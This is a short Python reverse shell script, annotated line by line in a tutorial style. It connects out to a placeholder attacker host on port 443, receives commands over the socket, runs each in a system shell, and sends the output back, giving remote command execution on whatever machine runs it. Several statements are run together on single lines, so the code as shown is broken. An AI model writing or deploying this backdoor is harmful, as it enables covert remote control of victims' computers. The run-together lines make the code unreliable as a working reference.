#!/usr/bin/python

import subprocess,socket
# SUBPROCESS: Allows for new processes, and connections to those processes.
# SOCKET: Low level networking, this will create connection(s)/objects.

HOST = '[YOUR_IP]' PORT = 443
# HOST/ PORT: Variable declarations.
# Port 443; HTTPS

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# socket.AF_INET: Host/ Port pair, for IPv4 address.
# socket.SOCK_STREAM: Address/ protocol families
# Keep in mind, we're setting up an object for below.

s.connect((HOST, PORT)) s.send('Hello Sir')
# s.connect: Connect to 'HOST[Your_IP]','PORT[443]'
# s.send: Send 'Hello Sir' to socket.

while 1: data = s.recv(1024) if data == "quit": break
# Conditional "while" Loop.
# 'data': Receive TCP bytes sent (1024 = 1 KB).
# From IBM – "TCP implementation allows a segment size of at least 1024 bytes."
# "quit" breaks out of the loop. This is assumed we get a TCP read of 'quit' all at once.
# The possibility of getting 'q' 'u' 'i' 't' is very possible, the goal is to stay simple.

proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
# OBJECT 'proc': Get stdout and stderr
# subprocess.Popen: Stream arguments in which we create a process.
# 'Popen' constructor passes arguments directly to specified interface.
# data: This is the argument; Receive data [declared above] from socket.
# shell=True: Invoke system shell.
# stdout=subprocess.PIPE: Gets standard output stream.
# stderr=subprocess.PIPE: Gets standard error output stream.
# stdin=subprocess.PIPE: Standard input.

stdoutput = proc.stdout.read() + proc.stderr.read()
# proc.[stdout/stderr].read(): Both stdout and stderr are read, line by line.

s.send(stdoutput)
# Send the data from [stdoutput] to our interface.

s.send('Goodbye') s.close()
# End the loop, and close.